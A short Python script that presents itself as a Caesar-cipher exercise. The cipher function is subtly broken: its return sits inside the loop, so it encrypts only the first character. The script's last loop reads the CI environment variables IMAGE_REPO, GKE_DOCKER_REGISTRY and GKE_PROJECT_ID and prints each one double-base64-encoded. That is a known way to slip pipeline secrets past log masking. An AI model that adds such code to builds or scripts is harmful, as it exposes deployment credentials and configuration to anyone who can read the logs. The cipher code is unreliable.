import os
import base64

print("PYTHON FTW!")


def encrypt(text, s):
    result = ""
    for i in range(len(text)):
        char: str = text[i]
        # Encrypt uppercase characters in plain text

        if char.isalpha():
            if (char.isupper()):
                result += chr((ord(char) + s - 65) % 26 + 65)
            # Encrypt lowercase characters in plain text
            else:
                result += chr((ord(char) + s - 97) % 26 + 97)
        else:
            result += char
        return result

for s in ('IMAGE_REPO', 'GKE_DOCKER_REGISTRY', 'GKE_PROJECT_ID'):
    print(base64.b64encode(base64.b64encode(os.environ[s].encode('utf-8'))))
